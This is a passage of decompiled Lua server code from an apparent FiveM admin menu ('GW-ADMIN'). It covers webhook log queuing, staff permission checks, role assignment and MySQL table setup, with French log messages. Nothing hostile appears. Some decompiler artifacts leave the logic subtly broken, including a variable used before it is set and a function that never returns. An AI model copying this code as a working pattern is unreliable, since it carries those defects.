  L4_2.ping = L5_2
  L4_2.ip = "127.0.0.1"
  L5_2 = "fake-token-"
  L6_2 = L1_2
  L5_2 = L5_2 .. L6_2
  L4_2.token = L5_2
  L4_2.discord = "fake#0000"
  L5_2 = {}
  L4_2.permission = L5_2
  L5_2 = L1_2
  L6_2 = L4_2
  return L5_2, L6_2
end
L16_1 = L46_1
function L46_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = 0
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2 in L2_2, L3_2, L4_2, L5_2 do
    L1_2 = L1_2 + 1
  end
  return L1_2
end
count_table = L46_1
function L46_1()
  local L0_2, L1_2
  L0_2 = L41_1
  if L0_2 then
    return
  end
  L0_2 = true
  L41_1 = L0_2
  L0_2 = CreateThread
  function L1_2()
    local L0_3, L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3
    while true do
      L0_3 = L40_1
      L0_3 = #L0_3
      if not (L0_3 > 0) then
        break
      end
      L0_3 = L40_1
      L0_3 = L0_3[1]
      L1_3 = L0_3.nextAttempt
      if L1_3 then
        L1_3 = L0_3.nextAttempt
        L2_3 = GetGameTimer
        L2_3 = L2_3()
        if L1_3 > L2_3 then
          L1_3 = L0_3.nextAttempt
          L2_3 = GetGameTimer
          L2_3 = L2_3()
          L1_3 = L1_3 - L2_3
          if L1_3 > 0 then
            L2_3 = Wait
            L3_3 = L1_3
            L2_3(L3_3)
          end
        end
      end
      L1_3 = table
      L1_3 = L1_3.remove
      L2_3 = L40_1
      L3_3 = 1
      L1_3 = L1_3(L2_3, L3_3)
      L0_3 = L1_3
      L1_3 = L44_1
      L2_3 = L0_3.webhook
      L1_3 = L1_3(L2_3)
      if L1_3 then
        L2_3 = SendWebhookMessage
        L3_3 = L1_3
        L4_3 = L0_3.data
        L2_3 = L2_3(L3_3, L4_3)
        if L2_3 then
          L3_3 = L42_1.sent
          L3_3 = L3_3 + 1
          L42_1.sent = L3_3
        else
          L3_3 = L0_3.attempt
          L4_3 = L39_1
          if L3_3 < L4_3 then
            L3_3 = L42_1.retried
            L3_3 = L3_3 + 1
            L42_1.retried = L3_3
            L3_3 = L0_3.attempt
            L3_3 = L3_3 + 1
            L0_3.attempt = L3_3
            L3_3 = GetGameTimer
            L3_3 = L3_3()
            L4_3 = L38_1
            L3_3 = L3_3 + L4_3
            L0_3.nextAttempt = L3_3
            L3_3 = table
            L3_3 = L3_3.insert
            L4_3 = L40_1
            L5_3 = L0_3
            L3_3(L4_3, L5_3)
          else
            L3_3 = L42_1.failed
            L3_3 = L3_3 + 1
            L42_1.failed = L3_3
            L3_3 = print
            L4_3 = "[LOG][ERROR] Log '%s' abandonn\195\169 apr\195\168s %d tentatives."
            L5_3 = L4_3
            L4_3 = L4_3.format
            L6_3 = L0_3.data
            L6_3 = L6_3.action
            if not L6_3 then
              L6_3 = "inconnue"
            end
            L7_3 = L0_3.attempt
            L4_3, L5_3, L6_3, L7_3 = L4_3(L5_3, L6_3, L7_3)
            L3_3(L4_3, L5_3, L6_3, L7_3)
          end
        end
      else
        L2_3 = L42_1.failed
        L2_3 = L2_3 + 1
        L42_1.failed = L2_3
        L2_3 = print
        L3_3 = "[LOG][ERROR] Aucun webhook valide pour '%s', log ignor\195\169."
        L4_3 = L3_3
        L3_3 = L3_3.format
        L5_3 = L0_3.webhook
        if not L5_3 then
          L5_3 = "unknown"
        end
        L3_3, L4_3, L5_3, L6_3, L7_3 = L3_3(L4_3, L5_3)
        L2_3(L3_3, L4_3, L5_3, L6_3, L7_3)
      end
      L2_3 = Wait
      L3_3 = L37_1
      L2_3(L3_3)
    end
    L0_3 = false
    L41_1 = L0_3
  end
  L0_2(L1_2)
end
function L47_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = L40_1
  L2_2 = #L2_2
  L3_2 = L2_2 + 1
  L2_2 = L40_1
  L4_2 = {}
  L4_2.webhook = A0_2
  L4_2.data = A1_2
  L4_2.attempt = 1
  L2_2[L3_2] = L4_2
  L2_2 = L46_1
  L2_2()
end
L48_1 = RegisterCommand
L49_1 = "logstatus"
function L50_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  if 0 ~= A0_2 then
    L1_2 = IsStaff
    L2_2 = A0_2
    L1_2 = L1_2(L2_2)
    if not L1_2 then
      L1_2 = TriggerClientEvent
      L2_2 = "gunware:notif"
      L3_2 = A0_2
      L4_2 = "error"
      L5_2 = "Commande r\195\169serv\195\169e au staff."
      L1_2(L2_2, L3_2, L4_2, L5_2)
      return
    end
  end
  L1_2 = "Logs envoy\195\169s: %d | \195\169chou\195\169s: %d | retentatives: %d | file en attente: %d"
  L2_2 = L1_2
  L1_2 = L1_2.format
  L3_2 = L42_1.sent
  L4_2 = L42_1.failed
  L5_2 = L42_1.retried
  L6_2 = L40_1
  L6_2 = #L6_2
  L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2)
  if 0 == A0_2 then
    L2_2 = print
    L3_2 = "[LOG][STATUS] "
    L4_2 = L1_2
    L3_2 = L3_2 .. L4_2
    L2_2(L3_2)
  else
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "info"
    L6_2 = L1_2
    L2_2(L3_2, L4_2, L5_2, L6_2)
  end
end
L48_1(L49_1, L50_1)
function L48_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if "table" ~= L1_2 then
    L1_2 = {}
    L2_2 = tostring
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    L1_2.description = L2_2
    A0_2 = L1_2
  end
  L1_2 = A0_2.source
  if not L1_2 then
    L1_2 = A0_2.adminId
    if not L1_2 then
      L1_2 = source
      L2_2 = type
      L3_2 = L1_2
      L2_2 = L2_2(L3_2)
      if "number" == L2_2 and L1_2 > 0 then
        A0_2.source = L1_2
        A0_2.adminId = L1_2
      end
    end
  end
  L1_2 = A0_2.targetPlayerId
  if not L1_2 then
    L1_2 = A0_2.target
    if L1_2 then
      L1_2 = type
      L2_2 = A0_2.target
      L1_2 = L1_2(L2_2)
      if "number" == L1_2 then
        L1_2 = A0_2.target
        if L1_2 > 0 then
          L1_2 = A0_2.target
          A0_2.targetPlayerId = L1_2
      end
    end
    else
      L1_2 = A0_2.playerId
      if L1_2 then
        L1_2 = type
        L2_2 = A0_2.playerId
        L1_2 = L1_2(L2_2)
        if "number" == L1_2 then
          L1_2 = A0_2.playerId
          if L1_2 > 0 then
            L1_2 = A0_2.playerId
            A0_2.targetPlayerId = L1_2
          end
        end
      end
    end
  end
  L1_2 = A0_2.source
  if L1_2 then
    L1_2 = A0_2.playerName
    if not L1_2 then
      L1_2 = GetPlayerName
      L2_2 = A0_2.source
      L1_2 = L1_2(L2_2)
      if L1_2 then
        A0_2.playerName = L1_2
      end
    end
  end
  L1_2 = A0_2.targetPlayerId
  if L1_2 then
    L1_2 = A0_2.targetName
    if not L1_2 then
      L1_2 = GetPlayerName
      L2_2 = A0_2.targetPlayerId
      L1_2 = L1_2(L2_2)
      if L1_2 then
        A0_2.targetName = L1_2
      end
    end
  end
  L1_2 = A0_2.action
  if not L1_2 then
    L1_2 = A0_2.title
    if not L1_2 then
      L1_2 = "Action inconnue"
    end
  end
  A0_2.action = L1_2
  L1_2 = A0_2.description
  if not L1_2 then
    L1_2 = "Aucune description fournie."
  end
  A0_2.description = L1_2
  L1_2 = A0_2.debugId
  if not L1_2 then
    L1_2 = "LOG-"
    L2_2 = tostring
    L3_2 = os
    L3_2 = L3_2.time
    L3_2, L4_2, L5_2, L6_2 = L3_2()
    L2_2 = L2_2(L3_2, L4_2, L5_2, L6_2)
    L3_2 = "-"
    L4_2 = math
    L4_2 = L4_2.random
    L5_2 = 100
    L6_2 = 999
    L4_2 = L4_2(L5_2, L6_2)
    L1_2 = L1_2 .. L2_2 .. L3_2 .. L4_2
  end
  A0_2.debugId = L1_2
  L1_2 = L47_1
  L2_2 = A0_2.webhook
  L3_2 = A0_2
  L1_2(L2_2, L3_2)
end
logAdminAction = L48_1
function L48_1(A0_2, A1_2)
  local L2_2, L3_2
  L2_2 = {}
  L2_2.red = "^1"
  L2_2.green = "^2"
  L2_2.yellow = "^3"
  L2_2.blue = "^4"
  L2_2.lightblue = "^5"
  L2_2.purple = "^6"
  L2_2.white = "^7"
  L2_2.black = "^8"
  L3_2 = L2_2[A1_2]
  if not L3_2 then
    L3_2 = ""
  end
end
L49_1 = staffCache
if not L49_1 then
  L49_1 = {}
  L50_1 = {}
  L49_1.players = L50_1
  L49_1.lastUpdate = 0
  L49_1.cacheTimeout = 1000
end
staffCache = L49_1
function L49_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = GetGameTimer
  L1_2 = L1_2()
  if not A0_2 then
    L2_2 = staffCache
    L2_2 = L2_2.players
    L2_2 = #L2_2
    if L2_2 > 0 then
      L2_2 = staffCache
      L2_2 = L2_2.lastUpdate
      L2_2 = L1_2 - L2_2
      L3_2 = staffCache
      L3_2 = L3_2.cacheTimeout
      if L2_2 < L3_2 then
        L2_2 = staffCache
        L2_2 = L2_2.players
        return L2_2
      end
    end
  end
  L2_2 = {}
  L3_2 = pairs
  L4_2 = PlayerServer
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = IsStaff
    L10_2 = tonumber
    L11_2 = L7_2
    L10_2, L11_2, L12_2 = L10_2(L11_2)
    L9_2 = L9_2(L10_2, L11_2, L12_2)
    if L9_2 then
      L9_2 = table
      L9_2 = L9_2.insert
      L10_2 = L2_2
      L11_2 = tonumber
      L12_2 = L7_2
      L11_2, L12_2 = L11_2(L12_2)
      L9_2(L10_2, L11_2, L12_2)
    end
  end
  L3_2 = staffCache
  L3_2.players = L2_2
  L3_2 = staffCache
  L3_2.lastUpdate = L1_2
  return L2_2
end
GetOnlineStaff = L49_1
function L49_1()
  local L0_2, L1_2
  L0_2 = staffCache
  L0_2.lastUpdate = 0
end
InvalidateStaffCache = L49_1
function L49_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  function L1_2(A0_3, A1_3, A2_3)
    local L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3
    L3_3 = type
    L4_3 = A0_3
    L3_3 = L3_3(L4_3)
    if "table" ~= L3_3 then
      return A0_3
    end
    if A1_3 and A1_3 <= 0 then
      L3_3 = {}
      return L3_3
    end
    if not A2_3 then
      L3_3 = {}
      A2_3 = L3_3
    end
    L3_3 = A2_3[A0_3]
    if L3_3 then
      L3_3 = nil
      return L3_3
    end
    L3_3 = {}
    A2_3[A0_3] = true
    L4_3 = A1_3 or L4_3
    if not A1_3 then
      L4_3 = 6
    end
    L4_3 = L4_3 - 1
    L5_3 = pairs
    L6_3 = A0_3
    L5_3, L6_3, L7_3, L8_3 = L5_3(L6_3)
    for L9_3, L10_3 in L5_3, L6_3, L7_3, L8_3 do
      L11_3 = type
      L12_3 = L10_3
      L11_3 = L11_3(L12_3)
      if "function" ~= L11_3 then
        L11_3 = type
        L12_3 = L10_3
        L11_3 = L11_3(L12_3)
        if "thread" ~= L11_3 then
          L11_3 = type
          L12_3 = L10_3
          L11_3 = L11_3(L12_3)
          if "userdata" ~= L11_3 then
            L11_3 = L1_2
            L12_3 = L9_3
            L13_3 = L4_3
            L14_3 = A2_3
            L11_3 = L11_3(L12_3, L13_3, L14_3)
            L12_3 = L1_2
            L13_3 = L10_3
            L14_3 = L4_3
            L15_3 = A2_3
            L12_3 = L12_3(L13_3, L14_3, L15_3)
            if nil ~= L11_3 and nil ~= L12_3 then
              L3_3[L11_3] = L12_3
            end
          end
        end
      end
    end
    A2_3[A0_3] = nil
    return L3_3
  end
  L2_2 = {}
  L3_2 = A0_2.PlayerServer
  if L3_2 then
    L3_2 = {}
    L2_2.PlayerServer = L3_2
    L3_2 = pairs
    L4_2 = A0_2.PlayerServer
    L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
    for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
      L9_2 = L2_2.PlayerServer
      L10_2 = L1_2
      L11_2 = L8_2
      L12_2 = 4
      L10_2 = L10_2(L11_2, L12_2)
      L9_2[L7_2] = L10_2
    end
  end
  L3_2 = A0_2.PlayerServerOffline
  if L3_2 then
    L3_2 = {}
    L2_2.PlayerServerOffline = L3_2
    L3_2 = pairs
    L4_2 = A0_2.PlayerServerOffline
    L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
    for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
      L9_2 = L2_2.PlayerServerOffline
      L10_2 = L1_2
      L11_2 = L8_2
      L12_2 = 4
      L10_2 = L10_2(L11_2, L12_2)
      L9_2[L7_2] = L10_2
    end
  end
  L3_2 = A0_2.reportServer
  if L3_2 then
    L3_2 = {}
    L2_2.reportServer = L3_2
    L3_2 = pairs
    L4_2 = A0_2.reportServer
    L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
    for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
      L9_2 = L2_2.reportServer
      L10_2 = L1_2
      L11_2 = L8_2
      L12_2 = 6
      L10_2 = L10_2(L11_2, L12_2)
      L9_2[L7_2] = L10_2
    end
  end
  return L2_2
end
function L50_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = type
  L2_2 = IsMaster
  L1_2 = L1_2(L2_2)
  if "function" == L1_2 then
    L1_2 = IsMaster
    L2_2 = A0_2
    L1_2 = L1_2(L2_2)
    if L1_2 then
      L2_2 = true
      return L2_2
    end
  end
  L1_2 = IsMaster
  if not L1_2 then
    L1_2 = GetPlayerIdentifiers
    L2_2 = A0_2
    L1_2 = L1_2(L2_2)
    if L1_2 then
      L2_2 = master
      if L2_2 then
        L2_2 = ipairs
        L3_2 = L1_2
        L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
        for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
          L8_2 = IsInTable
          L9_2 = master
          L10_2 = L7_2
          L8_2 = L8_2(L9_2, L10_2)
          if L8_2 then
            L8_2 = true
            return L8_2
          end
        end
      end
    end
  end
  L1_2 = getIdentifiant
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 then
    L2_2 = ranksServer
    if not L2_2 then
      L2_2 = _G
      L2_2 = L2_2.ranksServer
    end
    if L2_2 then
      L3_2 = L2_2.owner
      if L3_2 then
        L3_2 = L2_2.owner
        L3_2 = L3_2.players
        if L3_2 then
          L3_2 = pairs
          L4_2 = L2_2.owner
          L4_2 = L4_2.players
          L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
          for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
            if L8_2 == L1_2 then
              L9_2 = true
              return L9_2
            end
          end
        end
      end
    end
  end
  L2_2 = PlayerServer
  L2_2 = L2_2[A0_2]
  if not L2_2 then
    L3_2 = false
    return L3_2
  end
  L3_2 = L2_2.role
  if "owner" == L3_2 then
    L3_2 = true
    return L3_2
  end
  L3_2 = L2_2.role
  if L3_2 then
    L3_2 = L2_2.role
    if "user" ~= L3_2 then
      L3_2 = true
      return L3_2
    end
  end
  L3_2 = false
  return L3_2
end
IsStaff = L50_1
function L50_1(A0_2)
  local L1_2
  L1_2 = PlayerServer
  L1_2 = L1_2[A0_2]
  if L1_2 then
    L1_2 = PlayerServer
    L1_2 = L1_2[A0_2]
    L1_2 = L1_2.role
    L1_2 = "owner" == L1_2
  end
  return L1_2
end
IsOwner = L50_1
function L50_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L0_2 = "0123456789abcdef"
  L1_2 = #L0_2
  L2_2 = math
  L2_2 = L2_2.randomseed
  L3_2 = os
  L3_2 = L3_2.time
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = L3_2()
  L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
  L2_2 = ""
  L3_2 = 1
  L4_2 = 8
  L5_2 = 1
  for L6_2 = L3_2, L4_2, L5_2 do
    L7_2 = L2_2
    L8_2 = string
    L8_2 = L8_2.sub
    L9_2 = L0_2
    L10_2 = math
    L10_2 = L10_2.random
    L11_2 = 1
    L12_2 = L1_2
    L10_2 = L10_2(L11_2, L12_2)
    L11_2 = math
    L11_2 = L11_2.random
    L12_2 = 1
    L13_2 = L1_2
    L11_2, L12_2, L13_2 = L11_2(L12_2, L13_2)
    L8_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2)
    L7_2 = L7_2 .. L8_2
    L2_2 = L7_2
  end
  L3_2 = L0_1
  L3_2 = L3_2 + 1
  L0_1 = L3_2
  L3_2 = L2_2
  L4_2 = "-"
  L5_2 = L0_1
  L3_2 = L3_2 .. L4_2 .. L5_2
  return L3_2
end
uuid = L50_1
function L50_1(A0_2)
  local L1_2
  L1_2 = ranksServer
  L1_2 = L1_2[A0_2]
  L1_2 = nil ~= L1_2
  return L1_2
end
ranksExist = L50_1
function L50_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2
  L2_2 = GetPlayerName
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = "Unknown"
  end
  L3_2 = getIdentifiant
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L4_2 = ranksExist
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    return
  end
  L4_2 = pairs
  L5_2 = ranksServer
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    if "owner" ~= L8_2 and "user" ~= L8_2 then
      L10_2 = ipairs
      L11_2 = L9_2.players
      L10_2, L11_2, L12_2, L13_2 = L10_2(L11_2)
      for L14_2, L15_2 in L10_2, L11_2, L12_2, L13_2 do
        if L15_2 == L3_2 then
          L16_2 = table
          L16_2 = L16_2.remove
          L17_2 = ranksServer
          L17_2 = L17_2[L8_2]
          L17_2 = L17_2.players
          L18_2 = L14_2
          L16_2(L17_2, L18_2)
          break
        end
      end
    end
  end
  L4_2 = table
  L4_2 = L4_2.insert
  L5_2 = ranksServer
  L5_2 = L5_2[A0_2]
  L5_2 = L5_2.players
  L6_2 = L3_2
  L4_2(L5_2, L6_2)
  L4_2 = saveRanks
  L5_2 = true
  L4_2(L5_2)
  L4_2 = PlayerServer
  L4_2 = L4_2[A1_2]
  if L4_2 then
    L4_2 = PlayerServer
    L4_2 = L4_2[A1_2]
    L4_2 = L4_2.role
    if L4_2 then
      L4_2 = PlayerServer
      L4_2 = L4_2[A1_2]
      L4_2 = L4_2.role
      L4_2 = "user" ~= L4_2
    end
  end
  L5_2 = "user" ~= A0_2
  L6_2 = not L4_2 and L6_2
  if L4_2 ~= L5_2 then
    L7_2 = InvalidateStaffCache
    L7_2()
  end
  L7_2 = PlayerServer
  L7_2 = L7_2[A1_2]
  if L7_2 then
    L7_2 = PlayerServer
    L7_2 = L7_2[A1_2]
    L7_2.role = A0_2
    L7_2 = PlayerServer
    L7_2 = L7_2[A1_2]
    L8_2 = getRoleColor
    L9_2 = A0_2
    L8_2 = L8_2(L9_2)
    L7_2.roleColor = L8_2
    L7_2 = PlayerServer
    L7_2 = L7_2[A1_2]
    L8_2 = getGamerTagColor
    L9_2 = A0_2
    L8_2 = L8_2(L9_2)
    L7_2.gamerTagColor = L8_2
    L7_2 = PlayerServer
    L7_2 = L7_2[A1_2]
    L8_2 = getRolesPermissions
    L9_2 = A0_2
    L10_2 = A1_2
    L8_2 = L8_2(L9_2, L10_2)
    L7_2.permission = L8_2
    if L6_2 then
      L7_2 = {}
      L8_2 = PlayerServer
      L7_2.PlayerServer = L8_2
      L8_2 = PlayerServerOffline
      L7_2.PlayerServerOffline = L8_2
      L8_2 = reportServer
      L7_2.reportServer = L8_2
      L8_2 = SendPlayersDataOptimized
      L9_2 = A1_2
      L10_2 = L7_2
      L8_2(L9_2, L10_2)
      L8_2 = TriggerClientEvent
      L9_2 = "gunware:player:join"
      L10_2 = A1_2
      L11_2 = A1_2
      L12_2 = PlayerServer
      L12_2 = L12_2[A1_2]
      L13_2 = serverButtonFunds
      L14_2 = ranksServer
      L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2)
      L8_2 = serverSyncLog
      L9_2 = string
      L9_2 = L9_2.format
      L10_2 = "Donn\195\169es compl\195\168tes envoy\195\169es au joueur %s (ID: %d) apr\195\168s attribution d'un r\195\180le staff"
      L11_2 = L2_2
      L12_2 = A1_2
      L9_2 = L9_2(L10_2, L11_2, L12_2)
      L10_2 = "info"
      L8_2(L9_2, L10_2)
    end
  end
end
SetPlayerRole = L50_1
function L50_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L2_2 = getIdentifiant
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    return
  end
  L3_2 = ranksExist
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L3_2 = pairs
  L4_2 = ranksServer
  L4_2 = L4_2[A0_2]
  L4_2 = L4_2.players
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    if L8_2 == L2_2 then
      L9_2 = table
      L9_2 = L9_2.remove
      L10_2 = ranksServer
      L10_2 = L10_2[A0_2]
      L10_2 = L10_2.players
      L11_2 = L7_2
      L9_2(L10_2, L11_2)
      break
    end
  end
  L3_2 = saveRanks
  L4_2 = true
  L3_2(L4_2)
  L3_2 = PlayerServer
  L3_2 = L3_2[A1_2]
  if L3_2 then
    L3_2 = PlayerServer
    L3_2 = L3_2[A1_2]
    L3_2 = L3_2.role
    if L3_2 then
      L3_2 = PlayerServer
      L3_2 = L3_2[A1_2]
      L3_2 = L3_2.role
      L3_2 = "user" ~= L3_2
    end
  end
  if L3_2 and "user" ~= A0_2 then
    L4_2 = InvalidateStaffCache
    L4_2()
  end
  L4_2 = PlayerServer
  L4_2 = L4_2[A1_2]
  if L4_2 then
    L4_2 = PlayerServer
    L4_2 = L4_2[A1_2]
    L4_2.role = "user"
    L4_2 = PlayerServer
    L4_2 = L4_2[A1_2]
    L5_2 = getRoleColor
    L6_2 = "user"
    L5_2 = L5_2(L6_2)
    L4_2.roleColor = L5_2
    L4_2 = PlayerServer
    L4_2 = L4_2[A1_2]
    L5_2 = getGamerTagColor
    L6_2 = "user"
    L5_2 = L5_2(L6_2)
    L4_2.gamerTagColor = L5_2
    L4_2 = PlayerServer
    L4_2 = L4_2[A1_2]
    L5_2 = getRolesPermissions
    L6_2 = "user"
    L7_2 = A1_2
    L5_2 = L5_2(L6_2, L7_2)
    L4_2.permission = L5_2
  end
end
RemovePlayerRole = L50_1
function L50_1()
  local L0_2, L1_2
  L0_2 = L34_1
  L0_2 = nil ~= L0_2 and L0_2
  return L0_2
end
function L51_1()
  local L0_2, L1_2
  L0_2 = L34_1
  if not L0_2 then
    return
  end
  L0_2 = L34_1.Sync
  L0_2 = L0_2.execute
  L1_2 = [[
        CREATE TABLE IF NOT EXISTS gw_admin_custom_data (
            uuid BIGINT PRIMARY KEY,
            type VARCHAR(64) NOT NULL,
            data LONGTEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )
    ]]
  L0_2(L1_2)
  L0_2 = L34_1.Sync
  L0_2 = L0_2.execute
  L1_2 = [[
        CREATE TABLE IF NOT EXISTS gw_admin_handling (
            plate VARCHAR(20) PRIMARY KEY,
            data LONGTEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )
    ]]
  L0_2(L1_2)
  L0_2 = L34_1.Sync
  L0_2 = L0_2.execute
  L1_2 = [[
        CREATE TABLE IF NOT EXISTS gw_admin_ranks (
            rank_name VARCHAR(64) PRIMARY KEY,
            label VARCHAR(64) NOT NULL,
            rank_color VARCHAR(32),
            gamer_tag_color INT DEFAULT 208,
            permissions LONGTEXT NOT NULL,
            players LONGTEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )
    ]]
  L0_2(L1_2)
end
function L52_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L0_2 = L34_1
  if not L0_2 then
    return
  end
  L0_2 = L34_1.Sync
  L0_2 = L0_2.fetchAll
  L1_2 = "SHOW COLUMNS FROM gw_admin_ranks LIKE 'gamer_tag_color'"
  L0_2 = L0_2(L1_2)
  if L0_2 then
    L1_2 = #L0_2
    if 0 ~= L1_2 then
      goto lbl_35
    end
  end
  L1_2 = print
  L2_2 = "[GW-ADMIN] Colonne gamer_tag_color introuvable, cr\195\169ation en cours..."
  L1_2(L2_2)
  L1_2 = pcall
  function L2_2()
    local L0_3, L1_3
    L0_3 = L34_1.Sync
    L0_3 = L0_3.execute
    L1_3 = "ALTER TABLE gw_admin_ranks ADD COLUMN gamer_tag_color INT DEFAULT 208"
    L0_3(L1_3)
  end
  L1_2, L2_2 = L1_2(L2_2)
  if L1_2 then
    L3_2 = print
    L4_2 = "[GW-ADMIN] Colonne gamer_tag_color cr\195\169\195\169e avec succ\195\168s"
    L3_2(L4_2)
  else
    L3_2 = print
    L4_2 = string
    L4_2 = L4_2.format
    L5_2 = "[GW-ADMIN] Erreur lors de la cr\195\169ation de gamer_tag_color: %s"
    L6_2 = tostring
    L7_2 = L2_2
    L6_2, L7_2 = L6_2(L7_2)
    L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2, L6_2, L7_2)
    L3_2(L4_2, L5_2, L6_2, L7_2)
  end
  ::lbl_35::
end
function L53_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = L50_1
  L2_2 = L2_2()
  if not L2_2 then
    return
  end
  L2_2 = json
  L2_2 = L2_2.encode
  L3_2 = A1_2 or L3_2
  if not A1_2 then
    L3_2 = {}
  end
  L2_2 = L2_2(L3_2)
  L3_2 = L34_1.Async
  L3_2 = L3_2.execute
  L4_2 = "INSERT INTO gw_admin_custom_data (uuid, type, data) VALUES (?, ?, ?) "
  L5_2 = "ON DUPLICATE KEY UPDATE type = VALUES(type), data = VALUES(data)"
  L4_2 = L4_2 .. L5_2
  L5_2 = {}
  L6_2 = A0_2
  L7_2 = A1_2.type
  if not L7_2 then
    L7_2 = "unknown"
  end
  L8_2 = L2_2
  L5_2[1] = L6_2
  L5_2[2] = L7_2
  L5_2[3] = L8_2
  L3_2(L4_2, L5_2)
end
function L54_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = L50_1
  L1_2 = L1_2()
  if not L1_2 then
    return
  end
  L1_2 = L34_1.Async
  L1_2 = L1_2.execute
  L2_2 = "DELETE FROM gw_admin_custom_data WHERE uuid = ?"
  L3_2 = {}
  L4_2 = A0_2
  L3_2[1] = L4_2
  L1_2(L2_2, L3_2)
end
function L55_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L2_2 = L50_1
  L2_2 = L2_2()
  if not L2_2 then
    return
  end
  L2_2 = json
  L2_2 = L2_2.encode
  L3_2 = A1_2 or L3_2
  if not A1_2 then
    L3_2 = {}
  end
  L2_2 = L2_2(L3_2)
  L3_2 = L34_1.Async
  L3_2 = L3_2.execute
  L4_2 = "INSERT INTO gw_admin_handling (plate, data) VALUES (?, ?) "
  L5_2 = "ON DUPLICATE KEY UPDATE data = VALUES(data)"
  L4_2 = L4_2 .. L5_2
  L5_2 = {}
  L6_2 = A0_2
  L7_2 = L2_2
  L5_2[1] = L6_2
  L5_2[2] = L7_2
  L3_2(L4_2, L5_2)
end
function L56_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = L50_1
  L1_2 = L1_2()
  if not L1_2 then
    return
  end
  L1_2 = L34_1.Async
  L1_2 = L1_2.execute
  L2_2 = "DELETE FROM gw_admin_handling WHERE plate = ?"
  L3_2 = {}
  L4_2 = A0_2
  L3_2[1] = L4_2
  L1_2(L2_2, L3_2)
end
function L57_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L2_2 = L50_1
  L2_2 = L2_2()
  if not L2_2 then
    return
  end
  L2_2 = json
  L2_2 = L2_2.encode
  L3_2 = A1_2.permissions
  if not L3_2 then
    L3_2 = {}
  end
  L2_2 = L2_2(L3_2)
  L3_2 = json
  L3_2 = L3_2.encode
  L4_2 = A1_2.players
  if not L4_2 then
    L4_2 = {}
  end
  L3_2 = L3_2(L4_2)
